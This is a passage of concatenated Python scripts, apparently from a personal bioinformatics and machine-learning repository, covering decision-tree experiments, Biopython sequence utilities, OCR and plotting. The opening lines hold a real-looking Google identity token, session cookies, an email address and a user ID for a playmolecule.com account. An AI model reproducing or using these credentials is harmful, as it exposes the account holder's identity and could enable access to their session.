		"_ga_GTXV4CZ5SZ": "GS1.1.1686591251.6.0.1686591251.0.0.0",
		"_gid": "GA1.2.2041009314.1686498722",
		"G_AUTHUSER_H": "0",
		"G_EMAIL": "jaguaryehia4@gmail.com",
		"G_ENABLED_IDPS": "google",
		"G_SESSION": "eyJhbGciOiJSUzI1NiIsImtpZCI6Ijg1YmE5MzEzZmQ3YTdkNGFmYTg0ODg0YWJjYzg0MDMwMDQzNjMxODAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiODE5OTYzMjEwMzY0LWthYnY0b2ZjOXA0djNoYmZxYmJ2ZjE4YTd0ZGc4aWgzLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiYXVkIjoiODE5OTYzMjEwMzY0LWthYnY0b2ZjOXA0djNoYmZxYmJ2ZjE4YTd0ZGc4aWgzLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwic3ViIjoiMTExMDgyMzIyNDk3MTM4ODcxNzA2IiwiZW1haWwiOiJqYWd1YXJ5ZWhpYTRAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImF0X2hhc2giOiJLM21CVXNKWGIwNF9iOGNNRUk4YXp3IiwibmFtZSI6IkphZ3VhciBZZWhpYSIsInBpY3R1cmUiOiJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQWNIVHRkVUMzMFRmeW5aODBPZEp1cmFibTlXRkxKSkg1Y195V0RpbjlsNT1zOTYtYyIsImdpdmVuX25hbWUiOiJKYWd1YXIiLCJmYW1pbHlfbmFtZSI6IlllaGlhIiwibG9jYWxlIjoiZW4tR0IiLCJpYXQiOjE2ODY1MTMxOTQsImV4cCI6MTY4NjUxNjc5NCwianRpIjoiOWVlM2RmOTU5ZDMwNTNjM2YwZTg5ZDA5ZTg4YzM0YzU1MmQzY2E0OCJ9.mapq8TS0NBtFZkJczpatrYcO5pqllVInD7zPVaESPpQoNTT5xUDeYvrs1vO_YsHWS_PqqkebolYWngefdHJRIWiqsXfqdaR3MCJ2GHkS1OGHXKUXYRAQT-ZaZvtI5BEt9cs-WFJaEC4rnP7khM84-s0XVgPcAONiK-A2gPycSk5aLk9sOtUWMmcSqnhwy5sxc6B7K9jM76PaZoK_QaBm0YmcCEp8VGvBtEQ7RducJREcJbbK-0PXPRDXqogjoRQUVcJIHFc90uIP_LEWUs3L7l-Um5nETNYF6dGsL8XY6AIvMf9Gm39viLX8Bkp9CB0OS0Y2_PiuooZTOxzVjnJkjw",
		"G_USERID": "111082322497138871706",
		"session": ".eJy9ksuyqjgYhd9lzz0VAqj0TAQRNNwhJJNdEJT7xSMK0tXv3uip2tVP0COKENb6_7W-v78uLyNPNFZYheEFs86ZhX7Xm6Gne32tlxlHGlVEszrTxuGJn1amdmiInwFLyQDBRknmDCAFjUhxZrNEk6XsivPeAJdo99Y8hZxTXJ1fi03PePQ-ygk0nykWAXuJbQKlNtGCB4HSoBdjQaJ-1MuusBRVtHwyo1Id0UzAGQ85aQlIIC2taAfS0uxIQyfSGMuJKiyjAaoxIcbZfG4OIzuiB4XSk8KpTiOzZo35TFq3TlrnP15h9X95MT4s3l7IVyekZC806y9TqXjkI8FS2GTOO_i-RzGXx3h853QjOOVIZIgU5z3x3R2Fn28_mn_uTte0CV8xpj3FTmG17ivFwVLhAUQwzxnM3lpnBLl9GJknrOmjeZAKSzNNN6iEJW_-rZU0h4F6S-VVn1M-zFkh04-vt-DQyj3hXY41wVurS4_uyObueYZTh346DDkGw9cy2yPVwke6F8sEgifxJNnBph4e3SoM0IwObnPBYmwpsk3VftE8FIlfR241nbxqwY2TxBC4fVLWd9Pn5qWXgbzeSKb9sucjgmKe4M8cpz_56G_cGoK5PjnW15896rqOtTr_7KZJJcFT_c6fYmFwweefnkRLXqUKLYVwSw-T5TuLTyiwBX3kE8Esg8ksmWjuxyJu3f7DCg5rBN3G8gORLtib_gI9JCP1s-V9Jy5PYSEJkDngUOPMBKrA2hvSrybub1vfA6Y8HGhlsLmPh9-EWWJ_q-tQb5XNbIex6tm905m-L06BciHP33fuaX2T-xF73_btVl2Sria4zS7X9Gi4Oi5u9-h6S2OXR3sDasfK4yztGJ2CiLg7x1_RmD4HXZTVQWL3FT4YsboXfrf2psrRVljdQRRmNttZZnFa7WBmv5hXifG5ku7WEGDUMO_W5uNLvE9sLW9OUok2azum3enbieUGkIbt1X4bak95UJ2Nmz6Y4arMSJLTCtiR7SrRrcvKznWCkBn68cAk8NDt77O6IMqfN_UqaMRW9U1yWKfa_byNyHqnP9FV0hpeehbnaCtXvbSXgeUBAr_t4tF11LemOSxboyrHr7--LlIiAADTrRRDPk1jPllL13QL0i0vbC-i-PXPv7Nfp7I.ZIb7kA.qOfmzBoPjw--6e-nZb_Bp9Ms-G0",
		"USERNAME": "Jaguar Yehia"
	}
"""
print('MADE REQUEST')
response = requests.post("https://playmolecule.com/LiGANN/getResults", json=data, cookies=auth_cookies)
print('REQUEST FINISHED')
print(response.text)
results = response.json()[0]['promise']
isFinished = results['status'] == 'Finished'
"""
"""
response = requests.post("https://playmolecule.com/LiGANN/submitJob", files={'model': "{\"nprotgen\":10,\"nligdecode\":10,\"protFile\":{\"name\":\"POLY_I.txt.pdb\",\"lastModified\":1686515972114,\"webkitRelativePath\":\"\",\"size\":777622,\"type\":\"\"},\"threeDBox\":{\"3DBox_x\":129.18,\"3DBox_y\":119.85,\"3DBox_z\":127.18},\"citation_policy\":\"true\"}", 'protFile': open(first_path, 'rb')}, cookies=auth_cookies)
print(response.text)
print(response.request.body, response.request.headers)"""

from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests

# Object data to be sent
data = {
    "name": "John Doe",
    "age": 30
}

# Create a MultipartEncoder instance
multipart_data = MultipartEncoder(fields=data)
print(multipart_data)
import pandas as pd
import nltk
import random
import sys
from sklearn.tree import DecisionTreeClassifier  # Import Decision Tree Classifier
from sklearn.model_selection import train_test_split
from sklearn import metrics  # Import scikit-learn metrics module for accuracy calculation

names = ['Class Name', 'handicapped-infants', 'water-project-cost-sharing', 'adoption-of-the-budget-resolution',
         'physician-fee-freeze'
    , 'el-salvador-aid', 'religious-groups-in-schools', 'anti-satellite-test-ban', 'aid-to-nicaraguan-contras',
         'mx-missile', 'immigration'
    , 'synfuels-corporation-cutback', 'education-spending', 'superfund-right-to-sue', 'crime', 'duty-free-exports'
    , 'export-administration-act-south-africa']

dataset = pd.read_csv('house-votes-84.data', names=names)
# print(dataset['Class Name'].head())

# replacement of missing values with major value
for i in names:
    col = dataset[i]
    most_freq = max(nltk.FreqDist(col))
    # print(most_freq,i)
    # print(col[2],i)
    for j in range(0, len(col)):
        if (col[j] == '?'):
            col[j] = most_freq
    dataset[i] = col

# print(dataset.head())

feature_matrix = ['handicapped-infants', 'water-project-cost-sharing', 'adoption-of-the-budget-resolution',
                  'physician-fee-freeze'
    , 'el-salvador-aid', 'religious-groups-in-schools', 'anti-satellite-test-ban', 'aid-to-nicaraguan-contras',
                  'mx-missile', 'immigration'
    , 'synfuels-corporation-cutback', 'education-spending', 'superfund-right-to-sue', 'crime', 'duty-free-exports'
    , 'export-administration-act-south-africa']
# print(dataset[feature_matrix])

# map dataset to 0 and 1
for i in names:
    col = dataset[i]
    for j in range(0, len(col)):
        if (col[j] == 'n'):
            col[j] = 0
        elif (col[j] == 'y'):
            col[j] = 1
    dataset[i] = col

# print(dataset)

# Split dataset into training set and test set
X = dataset[feature_matrix]
y = dataset['Class Name']

test_size = [0.2, 0.3, 0.4, 0.5]

'''
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.5, random_state=8 ) 

      #BUILD THE MODEL
tree_model = DecisionTreeClassifier()
tree_model.fit(X_train,y_train)


y_predicted=tree_model.predict(X_test)
print("Accuracy:",metrics.accuracy_score(y_test, y_predicted))
treeObj = tree_model.tree_
print (treeObj.node_count)
'''
each_size_accuracy = []
each_size_sTree = []
each_seed = []
all_seeds = []
random_state = [[8, 14, 25, 28, 31], [14, 17, 20, 25, 32], [3, 17, 20, 26, 29], [3, 9, 14, 17, 18]]
original_stdout = sys.stdout
resultFile = open('results.txt', 'w')
print("results of the expriment..")
sys.stdout = resultFile
for i in range(0, 4):
    seeds_accuracy = []
    seeds_sizes = []
    seeds = []
    for j in range(0, 5):
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=test_size[i],
                                                            random_state=random_state[i][j])

        # BUILD THE MODEL
        tree_model = DecisionTreeClassifier()
        tree_model.random_state = random_state[i][j]
        tree_model.fit(X_train, y_train)

        y_predicted = tree_model.predict(X_test)
        # Model Accuracy, how often is the classifier correct?
        print("size: ", test_size[i], " seed: ", random_state[i][j])
        print("Accuracy:", metrics.accuracy_score(y_test, y_predicted))
        treeObj = tree_model.tree_
        print("size of tree:", treeObj.node_count)
        # each_seed.append([metrics.accuracy_score(y_test, y_predicted),treeObj.node_count,test_size[i],random_state[j]])
        seeds_accuracy.append(metrics.accuracy_score(y_test, y_predicted))
        seeds_sizes.append(treeObj.node_count)
        seeds.append(random_state[i][j])
    print("min acuuraccy:", min(seeds_accuracy))
    print("max accuraccy :", max(seeds_accuracy))
    print("average accuraccy:", sum(seeds_accuracy) / len(seeds_accuracy))
    print("min tree size:", min(seeds_sizes))
    print("max tree size:", max(seeds_sizes))
    print("average tree size:", sum(seeds_sizes) / len(seeds_sizes))
    each_size_accuracy.append([min(seeds_accuracy), max(seeds_accuracy)])
    each_size_sTree.append([min(seeds_sizes), max(seeds_sizes)])
    all_seeds.append(seeds)
# print(each_size_accuracy)
# print(each_size_sTree)

resultFile.close()
sys.stdout = original_stdout
print("done")

import pandas as pd
import nltk
import random
import sys
from sklearn.tree import DecisionTreeClassifier  # Import Decision Tree Classifier
from sklearn.model_selection import train_test_split
from sklearn import metrics  # Import scikit-learn metrics module for accuracy calculation

names = ['Class Name', 'handicapped-infants', 'water-project-cost-sharing', 'adoption-of-the-budget-resolution',
         'physician-fee-freeze'
    , 'el-salvador-aid', 'religious-groups-in-schools', 'anti-satellite-test-ban', 'aid-to-nicaraguan-contras',
         'mx-missile', 'immigration'
    , 'synfuels-corporation-cutback', 'education-spending', 'superfund-right-to-sue', 'crime', 'duty-free-exports'
    , 'export-administration-act-south-africa']

dataset = pd.read_csv('house-votes-84.data', names=names)
# print(dataset['Class Name'].head())

# replacement of missing values with major value
for i in names:
    col = dataset[i]
    most_freq = max(nltk.FreqDist(col))
    # print(most_freq,i)
    # print(col[2],i)
    for j in range(0, len(col)):
        if col[j] == '?':
            col[j] = most_freq
    dataset[i] = col

# print(dataset.head())

feature_matrix = ['handicapped-infants', 'water-project-cost-sharing', 'adoption-of-the-budget-resolution',
                  'physician-fee-freeze'
    , 'el-salvador-aid', 'religious-groups-in-schools', 'anti-satellite-test-ban', 'aid-to-nicaraguan-contras',
                  'mx-missile', 'immigration'
    , 'synfuels-corporation-cutback', 'education-spending', 'superfund-right-to-sue', 'crime', 'duty-free-exports'
    , 'export-administration-act-south-africa']
# print(dataset[feature_matrix])

# map dataset to 0 and 1
for i in names:
    col = dataset[i]
    for j in range(0, len(col)):
        if (col[j] == 'n'):
            col[j] = 0
        elif (col[j] == 'y'):
            col[j] = 1
    dataset[i] = col

# print(dataset)

# Split dataset into training set and test set
X = dataset[feature_matrix]
y = dataset['Class Name']

test_size = [0.2, 0.3, 0.4, 0.5]

'''
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.5, random_state=8 ) 

      #BUILD THE MODEL
tree_model = DecisionTreeClassifier()
tree_model.fit(X_train,y_train)


y_predicted=tree_model.predict(X_test)
print("Accuracy:",metrics.accuracy_score(y_test, y_predicted))
treeObj = tree_model.tree_
print (treeObj.node_count)
'''
each_size_accuracy = []
each_size_sTree = []
each_seed = []
all_seeds = []

original_stdout = sys.stdout
resultFile = open('results.txt', 'w')
print("results of the expriment..")
sys.stdout = resultFile
for i in range(0, 4):
    seeds_accuracy = []
    seeds_sizes = []
    seeds = []
    random_state = [random.randint(0, 60) for i in range(0, 5)]
    for j in range(0, 5):
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=test_size[i], random_state=random_state[j])

        # BUILD THE MODEL
        tree_model = DecisionTreeClassifier()
        tree_model.fit(X_train, y_train)

        y_predicted = tree_model.predict(X_test)
        # Model Accuracy, how often is the classifier correct?
        print("size: ", test_size[i], " seed: ", random_state[j])
        print("Accuracy:", metrics.accuracy_score(y_test, y_predicted))
        treeObj = tree_model.tree_
        print("size of tree:", treeObj.node_count)
        # each_seed.append([metrics.accuracy_score(y_test, y_predicted),treeObj.node_count,test_size[i],random_state[j]])
        seeds_accuracy.append(metrics.accuracy_score(y_test, y_predicted))
        seeds_sizes.append(treeObj.node_count)
        seeds.append(random_state[j])
    print("min :", min(seeds_accuracy))
    print("max :", max(seeds_accuracy))
    each_size_accuracy.append([min(seeds_accuracy), max(seeds_accuracy)])
    each_size_sTree.append([min(seeds_sizes), max(seeds_sizes)])
    all_seeds.append(seeds)
# print(each_size_accuracy)
# print(each_size_sTree)

resultFile.close()
sys.stdout = original_stdout
print("done")


import itertools
import csv
amino_acids =['A','A','U','U','C','G','A','U','C','G','A','U','C','A', 'G', 'G', 'C', 'C', 'A', 'A', 'U', 'U', 'A', 'A' ,'C']
active_sites= ['A', 'C', 'G', 'T']
list_1 = amino_acids
list_2 = active_sites
unique_combinations = []
permut = itertools.permutations(list_2, len(list_1))
for comb in permut:
    print(list(zip(comb, list_1)))
with open('example.csv', 'w', encoding='utf-8') as file:
    writer = csv.writer(file, delimiter=" ", skipinitialspace=True)
    for comb in permut:
        writer.writerow(list(zip(comb, list_2)))
file.close()

from Bio import SeqIO
from Bio.SeqUtils import molecular_weight
import csv



yeast_genome_file = "yeast/yeast_genome.fasta.fasta"
yeast_ptt_file = "yeast/yeast_protein.ptt.ptt"





def extract_protein_sequences(yeast_genome):
    protein_sequences = {}
    for record in list(SeqIO.parse(yeast_genome, "fasta")):
        protein_id = record.id
        protein_sequence = str(record.seq.translate())
        protein_sequences[protein_id] = protein_sequence
    return protein_sequences


print(extract_protein_sequences(yeast_genome_file))

def parse_ptt_file(ptt_file):
    locus_tags = {}
    with open(ptt_file) as f:
        for line in f:
            if line.startswith("Gene"):
                continue
            fields = line.strip().split("\t")
            locus_tag = fields[0]
            start = int(fields[1])
            end = int(fields[2])
            locus_tags[locus_tag] = (start, end)
    return locus_tags






def calculate_molecular_weight(protein_sequence):
    return molecular_weight(protein_sequence)


# In[35]:
#
#
# with open("protein_molecular_weights.csv", "w", newline="") as f:
#     writer = csv.writer(f)
#     writer.writerow(["Locus Tag", "Molecular Weight"])
#
#
#     for locus_tag, protein_sequence in zip(yeast_locus_tags, yeast_protein_sequences):
#         mw = calculate_molecular_weight(protein_sequence)
#         writer.writerow([locus_tag, mw])
#
#
#     for locus_tag, protein_sequence in zip(ecoli_locus_tags, ecoli_protein_sequences):
#         mw = calculate_molecular_weight(protein_sequence)
#         writer.writerow([locus_tag, mw])
#
#
# # In[ ]:
#




from Bio import SeqIO
from Bio.SeqUtils import molecular_weight
import pandas as pd

yeast_genome_file = "protein.faa"
yeast_ptt_file = "scc.csv"

"""
    this function read filename which is the fasta file 
        input:
            :param filename - fasta file : as a string
        output:
            :return recs : dictionary from fasta records
"""


def read_FASTA_File(filename):
    print("....Reading FASTA file...." + filename)
    recs = dict()
    records = SeqIO.parse(filename, "fasta")
    for i in records:
        recs[i.id] = i.seq
    return recs


"""
    this function is calculating the molecular weight 
        input:
            :param ID and seq - dictionary : as dictionary
        output:
            :return dictionary : replace the seq with the MW
"""


def calculate_molecular_weight(dictionary):
    for k, v in dictionary.items():  # Use .items() to iterate over key-value pairs
        dictionary[k] = molecular_weight(v, seq_type='protein')
    return dictionary


"""
    this function read the file csv with pandas to make it dataframe 
        input:
            :param filename - csv file : as a csv file
        output:
            :return dataframe : dataframe which is containing Protein product and Locus tag to compare them later 
"""


def parse_ptt_file(ptt_file):
    df = pd.read_csv(ptt_file)
    df2 = df[['Protein product', 'Locus tag']]
    return df2


"""
    this function comparing the dataframe and the dictionary that have th MW 
        input:
            :param  dict() - dictionary  : as dictionary which have the id for comparing
            :param dataframe - df : the dataframe which has the Protein product to compare
        output:
            :return dataframe : which has the protein product Locus tag MW
"""


def comparing(dictionary, df):
    for key in dictionary.keys():
        if key in df['Protein product'].values:
            df.loc[df['Protein product'] == key, 'MW'] = dictionary[key]
    df.to_csv('yeast.csv')
    return df


print(comparing(calculate_molecular_weight(read_FASTA_File(yeast_genome_file)), parse_ptt_file(yeast_ptt_file)))


"""
    mutate a seq with all possible mutations
"""
# import itertools
#
#
# # Define a function named generate_mutations that takes a DNA sequence as input.
# def generate_mutations(sequence):
#     mutations = []  # Create an empty list to store the mutations.
#     sequence_length = len(sequence)  # Get the length of the input sequence.
#
#     # Define the set of possible nucleotides (A, T, C, G).
#     nucleotides = ['A', 'T', 'C', 'G']
#
#     # Use nested loops to generate mutations for each position in the sequence.
#     for i in range(sequence_length):
#         # Generate all possible combinations of nucleotides of the same length as the input sequence.
#         for mutation in itertools.product(nucleotides, repeat=sequence_length):
#             mutation = ''.join(mutation)  # Convert the mutation from a tuple to a string.
#
#             # Check if the mutation is not equal to the original sequence to avoid duplicates.
#             if mutation != sequence:
#                 mutations.append(mutation)  # Add the mutation to the mutations list.
#
#     return mutations  # Return the list of mutations.
#
#
# # Example usage:
# sequence = "ATCG"  # Define an example DNA sequence.
# mutations = generate_mutations(sequence)  # Call the function to generate mutations.
# print(mutations)


"""
    mutate a seq by counting the number of mutations that user needs
"""
# import itertools
#
#
# def generate_mutations(sequence, num_mutations):
#     mutations = set()  # Use a set to store unique mutations
#     sequence_length = len(sequence)
#     nucleotides = ['A', 'U', 'C', 'G']
#
#     while len(mutations) < num_mutations and sequence_length <= 2 * len(sequence):
#         for i in range(sequence_length):
#             for mutation in itertools.product(nucleotides, repeat=sequence_length):
#                 mutation = ''.join(mutation)
#                 if mutation != sequence:
#                     mutations.add(mutation)
#                     if len(mutations) == num_mutations:
#                         break
#         sequence_length += 1
#
#     return list(mutations)[:num_mutations]  # Convert set to list and return the first num_mutations mutations
#
#
# # Input: Prompt the user for a DNA sequence and the number of mutations they want.
# sequence = "AAUUCGAUCGAUCAGGCCAAUUAAC"
# num_mutations = int(input("Enter the number of mutations to generate: "))
#
# mutations = generate_mutations(sequence, num_mutations)
# print(mutations)


















import seqIO
from seqIO import *
from ExtractList import *


class AnalysisHummer:
    def __init__(self, hammer_file, seq_file, output_file, formatter=100):
        self.formatter = formatter
        self.hammer_file = readHUMMEROutput(hammer_file)
        self.seq_dict = extractSeqFromFastaFile(seq_file, self.hammer_file)
        self.output_file = writeSeqs(self.seq_dict, output_file, formatter)

    def getHUMMER(self):
        return self.hammer_file

    def getSeqDict(self,id_seq, start, end):
        return getGeneByIndex(self.seq_dict,id_seq,start,end)

from BioHandling import *


class AnalysisFastq:

    def __init__(self, fastq_file):
        self.fastq = read_FASTQ_File(fastq_file)

    def get_Info(self):
        return get_FASTQ_info(self.fastq)

"""
    pipline for making Big Biopython library for bioinformatics:
        1. Biopython library:
            1. handling errors and parsing files
            2. functions that can be edited and make it more optimized with C++
            3. see SWs that has more functionalities for it
            4. make ML for analysis and predicting the blank datasets or predicting the results

        2. transcriptomics for bioinformatics:
            1. see how is R working with transcriptomics and the researches for it
            2. make class for it and make all functions for transcriptomics analysis
            3. see SWs that has more functionalities for it
            4. make sure of handling and more optimized with C++
            5. make ML for analysis and predicting the blank datasets or predicting the results

        3. proteinomics for bioinformatics:
            1. see how is R working with proteinomics and the structure of the protein analysis
            2. make class for it and make all functions for proteinomics analysis
            3. see SWs that has more functionalities for it
            4. make sure of handling and more optimized with C++
            5. make ML for analysis and predicting the blank datasets or predicting the results

        4. metabolomics for bioinformatics:
            1. see how is R working with proteinomics and the structure of the metadata analysis
            2. make class for it and make all functions for metabolomics analysis
            3. see SWs that has more functionalities for it
            4. make sure of handling and more optimized with C++
            5. make ML for analysis and predicting the blank datasets or predicting the results

        5. genomics for bioinformatics:
            1. see how is R working with genomics and the researches for it
            2. make class for it and make all functions for genomics analysis
            3. see SWs that has more functionalities for it
            4. make sure of handling and more optimized with C++
            5. make ML for analysis and predicting the blank datasets or predicting the results
"""
import gzip
from collections import Counter
from Bio.SeqUtils import GC
from Bio import SeqIO
from Bio.Seq import Seq
from matplotlib import pyplot as plt


def getGCContent(seq):
    return GC(seq)


def dna_Reverse_Complement(dna):
    return Seq(dna).upper().reverse_complement_rna()


def dna_Complement(dna):
    return Seq(dna).upper().complement()


def dna_Translation(dna):
    return Seq(dna).upper().translate()


def dna_transcription(seq):
    return Seq(seq).upper().transcribe()


def dna_back_Transcribe(dna):
    return Seq(dna).upper().back_transcribe()


def fastq_N_uncalled_base(recs):
    n_cnt = Counter()
    for rec in recs:
        for i, letter in enumerate(rec.seq):
            pos = i + 1
            if letter == 'N':
                n_cnt[pos] += 1
    seq_len = max(n_cnt.keys())
    positions = range(1, seq_len + 1)
    fig, ax = plt.subplots(figsize=(16, 9))
    ax.plot(positions, [n_cnt[x] for x in positions])
    ax.set_xlim(1, seq_len)


def get_FASTQ_info(recs):
    rec = next(recs)
    print(rec)
    print(rec.id, rec.description, rec.seq)
    print(rec.letter_annotations)
    count = None
    for rec in recs:
        count = Counter(rec.seq)
    total = sum(count.values())
    for letter, count in count.items():
        print('%s: %.2f %d' % (letter, 100. * count / total, count))


def read_FASTQ_File(filename):
    print(f'Reading FASTQ...{filename}')
    if filename.endswith('.fastq.gz'):
        try:
            f = SeqIO.parse(gzip.open(filename, 'rt', encoding='utf-8'), 'fastq')
        except OSError:
            f = SeqIO.parse(filename, 'fastq')
    elif filename.endswith('.fastq'):
        f = SeqIO.parse(filename, 'fastq')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))
    return f


# def get_FASTA_info(recs):


def read_FASTA_File(filename):
    print(f'Reading FASTA...{filename}')
    if filename.endswith('.fasta.gz'):
        try:
            f = SeqIO.parse(gzip.open(filename, 'rt', encoding='utf-8'), 'fasta')
        except OSError:
            f = SeqIO.parse(filename, 'fasta')
    elif filename.endswith('.fasta'):
        f = SeqIO.parse(filename, 'fasta')
    else:
        raise ValueError("Invalid file extension: {}".format(filename))
    return f

# def alignmentFromFasta(fastaFileName, seq):



# from rpy2 import robjects
# r_code='''
#         # create a function `f`
#         f <- function(r, verbose=FALSE) {
#             if (verbose) {
#                 cat("I am calling f().\n")
#             }
#             2 * pi * r
#         }
#         '''
# robjects.r(r_code)
# r_f = robjects.globalenv['f']
# print(r_f(4))


# print('ahmed')
#
# # print('yehia')
# print('ali')

a=True
b=False
print(bool(a==b))

"""
    input: DNA
        1. translation -> protein:

        2. transcription -> RNA:

        3. alignment in blastn or (fasta && fastq)

        4. compare in fasta if it's gene
        5. statistics:
            1. plotting:
                1. GC Content
                2. Count Nucleotides

"""

from BioHandling import *


class DNA:

    def __init__(self, dna_seq):
        self.DNA = dna_seq

    def translation(self):
        return dna_Translation(self.DNA)

    def transcription(self):
        return dna_transcription(self.DNA)

    def back_Transcribe(self):
        return dna_back_Transcribe(self.DNA)

    def Complement(self):
        return dna_Complement(self.DNA)

    def reverse_Complement(self):
        return dna_Reverse_Complement(self.DNA)


    # def alignment(self, type_align=None, ):

import re

'''
    function fo extract seqs from fasta file using regex
        Input:
            :param seq_file: file path
            :param list(): list of ids to be compared
        output:
            :return dict() : dictionary contain ids as keys and sequences as values
'''


def extractSeqFromFastaFile(seq_file, id_list):
    seq_dict = dict()
    seq_file_content = open(seq_file, 'r').read()
    for id in id_list:
        pattern = re.compile(fr">({id})\s.*\n[A-z\n]+")
        if pattern.search(seq_file_content):
            seq_dict[id] = str(pattern.search(seq_file_content).group(0))
            seq_dict[id] = re.compile(fr">{id}\s.*\n").sub('', seq_dict[id]).replace('\n', '')
    return seq_dict

import pytesseract as ts
from PIL import Image
import os


def getDirectory(directory_name):
    vcf_files = [file for file in os.listdir(directory_name)]
    return vcf_files


def main(dictionary_name):
    for i in range(len(getDirectory(dictionary_name))):
        with open('135(1).txt', 'w') as f:
            f.write(ts.image_to_string(Image.open((os.path.join(dictionary_name, getDirectory(dictionary_name)[i])))))
        f.close()


ts.pytesseract.tesseract_cmd = r'C:/Users/jaguar/AppData/Local/Programs/Tesseract-OCR/tesseract.exe'
main('screen/')
# imgs = ts.image_to_string(Image.open('/screen/WhatsApp Image 2023-09-18 at 20.50.17.jpg'))
# print(imgs)

# import pandas as pd
#
#
# def replaceAll(all_f, rec_f, lig_f):
#     all_f['recID'] = all_f['recID'].str.replace('-', '')
#     all_f.reset_index(inplace=True)
#     lig_guide = {}
#     rec_guide = {}
#     for index, row in rec_f.iterrows():
#         rec_guide[row['ID']] = row['Name']
#     for index, row in lig_f.iterrows():
#         lig_guide[row['ID']] = row['Name']
#
#     for k, v in rec_guide.items():
#         x = str(v + k)
#         all_f['index'] = all_f['index'].replace(k, x)
#
#     for k, v in lig_guide.items():
#         x = str(v + k)
#         all_f['ligID'] = all_f['ligID'].replace(k, x)
#     all_f['recID'] = all_f['index']  # Rename 'recID' column to 'recID' (no change)
#     all_f.drop('index', axis=1, inplace=True)
#     print(all_f)
#     all_f.to_csv('RNAp.csv')
#
#
# lig_file = pd.read_table('ligand.txt', delim_whitespace=True, header=None, names=['Name', 'ID', 'Num'])
# all_file = pd.read_table('interaction.txt', delim_whitespace=True, header=None, names=['recID', 'ligID', 'Num'])
# rec_file = pd.read_table('rec.txt', delim_whitespace=True, header=None, names=['Name', 'ID', 'Num'])
#
# replaceAll(all_file, rec_file, lig_file)
#
# # import re
# #
# # x = open('protein.faa', 'r')
# # z = {}
# # ids = list()
# # seqs = list()
# # id = ''
# # seq = ''
# # for i in x:
# #     if re.findall("[^>\w\s$]", i):
# #         id = i.replace(">", '')
# #         id = id.strip()
# #         id = re.split(' ', id)
# #         ids.append(id)
# #     else:
# #         seq = i.strip()
# #         seqs.append(seq)
#
# # alldata = []
# #
# # for i in zip(ids, seqs):
# #     alldata.append(i)
# #
# # print(alldata)
#
# # import pandas as pd
# #
# # df = pd.read_table('microRNA.txt')
# # # df = pd.DataFrame(df)
# # print(df)
# # json_data = df.to_json(orient='records')
# #
# #
# # with open('microRNA.json','w') as f:
# #     f.write(json_data)

# import pandas as pd
# import matplotlib.pylab as plt
# import seaborn as sns
# import numpy as np
#
# df = pd.read_csv('DRUG2_DRUG1_NEW_1.txt', delim_whitespace=True)
#
# df1 = df.columns
# df['Significance'] = 'Non-significant'
# df.loc[(df['PValue'] < 0.5) & (df['log2FC'] > 0), 'Significance'] = 'Up-regulated'
# df.loc[(df['PValue'] < 0.5) & (df['log2FC'] < 0), 'Significance'] = 'Down-regulated'
# # Plot non-significant genes in grey
# plt.scatter(x=df.loc[df['Significance'] == 'Non-significant', 'log2FC'],
#             y=-np.log10(df.loc[df['Significance'] == 'Non-significant', 'PValue']),
#             color='grey', label='Non-significant',s=40)
# # Plot down-regulated genes in blue
# plt.scatter(x=df.loc[df['Significance'] == 'Down-regulated', 'log2FC'],
#             y=-np.log10(df.loc[df['Significance'] == 'Down-regulated', 'PValue']),
#             color='blue', label='Down-regulated',s=30)
# # Plot up-regulated genes in red
# plt.scatter(x=df.loc[df['Significance'] == 'Up-regulated', 'log2FC'],
#             y=-np.log10(df.loc[df['Significance'] == 'Up-regulated', 'PValue']),
#             color='red', label='Up-regulated',s=30)
# plt.xlabel('log2 Fold Change',fontsize=14)
# plt.ylabel('-log10(P value)',fontsize=14)
# plt.title('WTCJANR ZT10_vs_WTCJANR_ZT2',fontsize=14)
# plt.legend(fontsize=10, bbox_to_anchor=(1.1, 1), loc='upper left')
# plt.legend(fontsize=12)
# plt.show()

# import pandas as pd
# import matplotlib.pyplot as plt
# import seaborn as sns
# import numpy as np
#
# # Read the data from the file
# df = pd.read_csv('DRUG2_DRUG1_NEW_1.txt', delim_whitespace=True)
#
# # Define the significance threshold
# significant_threshold = 0.5
#
# # Create a 'Significance' column based on your criteria
# df['Significance'] = 'Non-significant'
# df.loc[(df['PValue'] < significant_threshold) & (df['log2FC'] > 0), 'Significance'] = 'Up-regulated'
# df.loc[(df['PValue'] < significant_threshold) & (df['log2FC'] < 0), 'Significance'] = 'Down-regulated'
#
# # Create a scatter plot
# plt.scatter(x=df.loc[df['Significance'] == 'Non-significant', 'log2FC'],
#             y=-np.log10(df.loc[df['Significance'] == 'Non-significant', 'PValue']),
#             color='grey', label='Non-significant', s=40, alpha=0.5)  # Add alpha for transparency
#
# plt.scatter(x=df.loc[df['Significance'] == 'Down-regulated', 'log2FC'],
#             y=-np.log10(df.loc[df['Significance'] == 'Down-regulated', 'PValue']),
#             color='blue', label='Down-regulated', s=30, alpha=0.5)
#
# plt.scatter(x=df.loc[df['Significance'] == 'Up-regulated', 'log2FC'],
#             y=-np.log10(df.loc[df['Significance'] == 'Up-regulated', 'PValue']),
#             color='red', label='Up-regulated', s=30, alpha=0.5)
#
# # Add labels for each gene
# # for i, row in df.iterrows():
# #     plt.text(row['log2FC'], -np.log10(row['PValue']), row['Gene'], fontsize=8, ha='center', va='bottom')
#
# plt.xlabel('log2 Fold Change', fontsize=14)
# plt.ylabel('-log10(P value)', fontsize=14)
# plt.title('WTCJANR ZT10_vs_WTCJANR_ZT2', fontsize=14)
# plt.legend(fontsize=10, bbox_to_anchor=(1.1, 1), loc='upper left')
# plt.legend(fontsize=12)
# plt.show()


import os

from IPython.display import Image
import rpy2.robjects as robjects
import rpy2.robjects.lib.ggplot2 as ggplot2
from rpy2.robjects.functions import SignatureTranslatedFunction
import pandas as pd
from rpy2.robjects import pandas2ri
from rpy2.robjects import default_converter
